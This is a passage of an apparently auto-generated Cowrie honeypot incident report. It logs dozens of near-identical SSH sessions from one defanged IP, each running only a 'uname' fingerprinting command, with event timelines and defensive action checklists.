| `2026-08-08 17:13:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d205b44ebd9e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:13 |
| **Last Seen** | 2026-08-08 17:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:13:34` | `cowrie.session.connect` |
| `2026-08-08 17:13:34` | `cowrie.client.version` |
| `2026-08-08 17:13:34` | `cowrie.client.kex` |
| `2026-08-08 17:13:35` | `cowrie.login.success` |
| `2026-08-08 17:13:35` | `cowrie.session.params` |
| `2026-08-08 17:13:35` | `cowrie.command.input` |
| `2026-08-08 17:13:36` | `cowrie.log.closed` |
| `2026-08-08 17:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7abde5acc07c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:13 |
| **Last Seen** | 2026-08-08 17:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:13:40` | `cowrie.session.connect` |
| `2026-08-08 17:13:40` | `cowrie.client.version` |
| `2026-08-08 17:13:41` | `cowrie.client.kex` |
| `2026-08-08 17:13:41` | `cowrie.login.success` |
| `2026-08-08 17:13:42` | `cowrie.session.params` |
| `2026-08-08 17:13:42` | `cowrie.command.input` |
| `2026-08-08 17:13:42` | `cowrie.log.closed` |
| `2026-08-08 17:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52d9482236b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:13 |
| **Last Seen** | 2026-08-08 17:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:13:47` | `cowrie.session.connect` |
| `2026-08-08 17:13:47` | `cowrie.client.version` |
| `2026-08-08 17:13:47` | `cowrie.client.kex` |
| `2026-08-08 17:13:47` | `cowrie.login.success` |
| `2026-08-08 17:13:48` | `cowrie.session.params` |
| `2026-08-08 17:13:48` | `cowrie.command.input` |
| `2026-08-08 17:13:48` | `cowrie.log.closed` |
| `2026-08-08 17:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d24571198aa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:13 |
| **Last Seen** | 2026-08-08 17:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:13:52` | `cowrie.session.connect` |
| `2026-08-08 17:13:53` | `cowrie.client.version` |
| `2026-08-08 17:13:53` | `cowrie.client.kex` |
| `2026-08-08 17:13:53` | `cowrie.login.success` |
| `2026-08-08 17:13:54` | `cowrie.session.params` |
| `2026-08-08 17:13:54` | `cowrie.command.input` |
| `2026-08-08 17:13:54` | `cowrie.log.closed` |
| `2026-08-08 17:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a08e3a099c50

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:13 |
| **Last Seen** | 2026-08-08 17:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:13:58` | `cowrie.session.connect` |
| `2026-08-08 17:13:58` | `cowrie.client.version` |
| `2026-08-08 17:13:59` | `cowrie.client.kex` |
| `2026-08-08 17:13:59` | `cowrie.login.success` |
| `2026-08-08 17:14:00` | `cowrie.session.params` |
| `2026-08-08 17:14:00` | `cowrie.command.input` |
| `2026-08-08 17:14:00` | `cowrie.log.closed` |
| `2026-08-08 17:14:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c03618fea01d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:14 |
| **Last Seen** | 2026-08-08 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:14:05` | `cowrie.session.connect` |
| `2026-08-08 17:14:05` | `cowrie.client.version` |
| `2026-08-08 17:14:05` | `cowrie.client.kex` |
| `2026-08-08 17:14:06` | `cowrie.login.success` |
| `2026-08-08 17:14:06` | `cowrie.session.params` |
| `2026-08-08 17:14:06` | `cowrie.command.input` |
| `2026-08-08 17:14:07` | `cowrie.log.closed` |
| `2026-08-08 17:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa70e6644ce1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:14 |
| **Last Seen** | 2026-08-08 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:14:12` | `cowrie.session.connect` |
| `2026-08-08 17:14:12` | `cowrie.client.version` |
| `2026-08-08 17:14:12` | `cowrie.client.kex` |
| `2026-08-08 17:14:13` | `cowrie.login.success` |
| `2026-08-08 17:14:14` | `cowrie.session.params` |
| `2026-08-08 17:14:14` | `cowrie.command.input` |
| `2026-08-08 17:14:14` | `cowrie.log.closed` |
| `2026-08-08 17:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56d299348663

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:14 |
| **Last Seen** | 2026-08-08 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:14:18` | `cowrie.session.connect` |
| `2026-08-08 17:14:18` | `cowrie.client.version` |
| `2026-08-08 17:14:18` | `cowrie.client.kex` |
| `2026-08-08 17:14:19` | `cowrie.login.success` |
| `2026-08-08 17:14:19` | `cowrie.session.params` |
| `2026-08-08 17:14:19` | `cowrie.command.input` |
| `2026-08-08 17:14:19` | `cowrie.log.closed` |
| `2026-08-08 17:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c49f3cf2256e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:14 |
| **Last Seen** | 2026-08-08 17:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:14:24` | `cowrie.session.connect` |
| `2026-08-08 17:14:24` | `cowrie.client.version` |
| `2026-08-08 17:14:24` | `cowrie.client.kex` |
| `2026-08-08 17:14:25` | `cowrie.login.success` |
| `2026-08-08 17:14:26` | `cowrie.session.params` |
| `2026-08-08 17:14:26` | `cowrie.command.input` |
| `2026-08-08 17:14:27` | `cowrie.log.closed` |
| `2026-08-08 17:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcd57e24078d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:14 |
| **Last Seen** | 2026-08-08 17:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:14:30` | `cowrie.session.connect` |
| `2026-08-08 17:14:30` | `cowrie.client.version` |
| `2026-08-08 17:14:30` | `cowrie.client.kex` |
| `2026-08-08 17:14:31` | `cowrie.login.success` |
| `2026-08-08 17:14:32` | `cowrie.session.params` |
| `2026-08-08 17:14:32` | `cowrie.command.input` |
| `2026-08-08 17:14:32` | `cowrie.log.closed` |
| `2026-08-08 17:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c850bcb7019e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:14 |
| **Last Seen** | 2026-08-08 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:14:36` | `cowrie.session.connect` |
| `2026-08-08 17:14:36` | `cowrie.client.version` |
| `2026-08-08 17:14:36` | `cowrie.client.kex` |
| `2026-08-08 17:14:36` | `cowrie.login.success` |
| `2026-08-08 17:14:38` | `cowrie.session.params` |
| `2026-08-08 17:14:38` | `cowrie.command.input` |
| `2026-08-08 17:14:38` | `cowrie.log.closed` |
| `2026-08-08 17:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-608aa48fd579

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:14 |
| **Last Seen** | 2026-08-08 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:14:42` | `cowrie.session.connect` |
| `2026-08-08 17:14:42` | `cowrie.client.version` |
| `2026-08-08 17:14:42` | `cowrie.client.kex` |
| `2026-08-08 17:14:42` | `cowrie.login.success` |
| `2026-08-08 17:14:43` | `cowrie.session.params` |
| `2026-08-08 17:14:43` | `cowrie.command.input` |
| `2026-08-08 17:14:44` | `cowrie.log.closed` |
| `2026-08-08 17:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d23e533ba23

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:14 |
| **Last Seen** | 2026-08-08 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:14:48` | `cowrie.session.connect` |
| `2026-08-08 17:14:48` | `cowrie.client.version` |
| `2026-08-08 17:14:48` | `cowrie.client.kex` |
| `2026-08-08 17:14:48` | `cowrie.login.success` |
| `2026-08-08 17:14:49` | `cowrie.session.params` |
| `2026-08-08 17:14:49` | `cowrie.command.input` |
| `2026-08-08 17:14:50` | `cowrie.log.closed` |
| `2026-08-08 17:14:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c389d9f7323

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:14 |
| **Last Seen** | 2026-08-08 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:14:53` | `cowrie.session.connect` |
| `2026-08-08 17:14:54` | `cowrie.client.version` |
| `2026-08-08 17:14:54` | `cowrie.client.kex` |
| `2026-08-08 17:14:54` | `cowrie.login.success` |
| `2026-08-08 17:14:55` | `cowrie.session.params` |
| `2026-08-08 17:14:55` | `cowrie.command.input` |
| `2026-08-08 17:14:55` | `cowrie.log.closed` |
| `2026-08-08 17:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dc063fb4b69

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:14 |
| **Last Seen** | 2026-08-08 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:14:59` | `cowrie.session.connect` |
| `2026-08-08 17:14:59` | `cowrie.client.version` |
| `2026-08-08 17:14:59` | `cowrie.client.kex` |
| `2026-08-08 17:15:00` | `cowrie.login.success` |
| `2026-08-08 17:15:01` | `cowrie.session.params` |
| `2026-08-08 17:15:01` | `cowrie.command.input` |
| `2026-08-08 17:15:01` | `cowrie.log.closed` |
| `2026-08-08 17:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad6965266839

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:15 |
| **Last Seen** | 2026-08-08 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:15:05` | `cowrie.session.connect` |
| `2026-08-08 17:15:05` | `cowrie.client.version` |
| `2026-08-08 17:15:05` | `cowrie.client.kex` |
| `2026-08-08 17:15:06` | `cowrie.login.success` |
| `2026-08-08 17:15:07` | `cowrie.session.params` |
| `2026-08-08 17:15:07` | `cowrie.command.input` |
| `2026-08-08 17:15:07` | `cowrie.log.closed` |
| `2026-08-08 17:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a124a5ac501

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:15 |
| **Last Seen** | 2026-08-08 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:15:11` | `cowrie.session.connect` |
| `2026-08-08 17:15:11` | `cowrie.client.version` |
| `2026-08-08 17:15:11` | `cowrie.client.kex` |
| `2026-08-08 17:15:12` | `cowrie.login.success` |
| `2026-08-08 17:15:13` | `cowrie.session.params` |
| `2026-08-08 17:15:13` | `cowrie.command.input` |
| `2026-08-08 17:15:13` | `cowrie.log.closed` |
| `2026-08-08 17:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f036cc34ce39

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:15 |
| **Last Seen** | 2026-08-08 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:15:17` | `cowrie.session.connect` |
| `2026-08-08 17:15:17` | `cowrie.client.version` |
| `2026-08-08 17:15:17` | `cowrie.client.kex` |
| `2026-08-08 17:15:17` | `cowrie.login.success` |
| `2026-08-08 17:15:18` | `cowrie.session.params` |
| `2026-08-08 17:15:18` | `cowrie.command.input` |
| `2026-08-08 17:15:18` | `cowrie.log.closed` |
| `2026-08-08 17:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a688e917c72b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:15 |
| **Last Seen** | 2026-08-08 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:15:22` | `cowrie.session.connect` |
| `2026-08-08 17:15:22` | `cowrie.client.version` |
| `2026-08-08 17:15:22` | `cowrie.client.kex` |
| `2026-08-08 17:15:24` | `cowrie.login.success` |
| `2026-08-08 17:15:24` | `cowrie.session.params` |
| `2026-08-08 17:15:24` | `cowrie.command.input` |
| `2026-08-08 17:15:25` | `cowrie.log.closed` |
| `2026-08-08 17:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caeba651cf4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:15 |
| **Last Seen** | 2026-08-08 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:15:28` | `cowrie.session.connect` |
| `2026-08-08 17:15:28` | `cowrie.client.version` |
| `2026-08-08 17:15:28` | `cowrie.client.kex` |
| `2026-08-08 17:15:29` | `cowrie.login.success` |
| `2026-08-08 17:15:30` | `cowrie.session.params` |
| `2026-08-08 17:15:30` | `cowrie.command.input` |
| `2026-08-08 17:15:30` | `cowrie.log.closed` |
| `2026-08-08 17:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1d19e5f2f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:15 |
| **Last Seen** | 2026-08-08 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:15:34` | `cowrie.session.connect` |
| `2026-08-08 17:15:34` | `cowrie.client.version` |
| `2026-08-08 17:15:34` | `cowrie.client.kex` |
| `2026-08-08 17:15:35` | `cowrie.login.success` |
| `2026-08-08 17:15:36` | `cowrie.session.params` |
| `2026-08-08 17:15:36` | `cowrie.command.input` |
| `2026-08-08 17:15:37` | `cowrie.log.closed` |
| `2026-08-08 17:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9904968c1e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:15 |
| **Last Seen** | 2026-08-08 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:15:40` | `cowrie.session.connect` |
| `2026-08-08 17:15:40` | `cowrie.client.version` |
| `2026-08-08 17:15:40` | `cowrie.client.kex` |
| `2026-08-08 17:15:41` | `cowrie.login.success` |
| `2026-08-08 17:15:42` | `cowrie.session.params` |
| `2026-08-08 17:15:42` | `cowrie.command.input` |
| `2026-08-08 17:15:42` | `cowrie.log.closed` |
| `2026-08-08 17:15:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee1635f698bc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:15 |
| **Last Seen** | 2026-08-08 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:15:46` | `cowrie.session.connect` |
| `2026-08-08 17:15:46` | `cowrie.client.version` |
| `2026-08-08 17:15:46` | `cowrie.client.kex` |
| `2026-08-08 17:15:47` | `cowrie.login.success` |
| `2026-08-08 17:15:48` | `cowrie.session.params` |
| `2026-08-08 17:15:48` | `cowrie.command.input` |
| `2026-08-08 17:15:48` | `cowrie.log.closed` |
| `2026-08-08 17:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b684bb4a9f42

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:15 |
| **Last Seen** | 2026-08-08 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:15:52` | `cowrie.session.connect` |
| `2026-08-08 17:15:52` | `cowrie.client.version` |
| `2026-08-08 17:15:52` | `cowrie.client.kex` |
| `2026-08-08 17:15:52` | `cowrie.login.success` |
| `2026-08-08 17:15:53` | `cowrie.session.params` |
| `2026-08-08 17:15:53` | `cowrie.command.input` |
| `2026-08-08 17:15:54` | `cowrie.log.closed` |
| `2026-08-08 17:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f0c5e86f979

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:15 |
| **Last Seen** | 2026-08-08 17:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:15:58` | `cowrie.session.connect` |
| `2026-08-08 17:15:58` | `cowrie.client.version` |
| `2026-08-08 17:15:58` | `cowrie.client.kex` |
| `2026-08-08 17:15:59` | `cowrie.login.success` |
| `2026-08-08 17:16:00` | `cowrie.session.params` |
| `2026-08-08 17:16:00` | `cowrie.command.input` |
| `2026-08-08 17:16:00` | `cowrie.log.closed` |
| `2026-08-08 17:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e588e2cf5376

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:16 |
| **Last Seen** | 2026-08-08 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
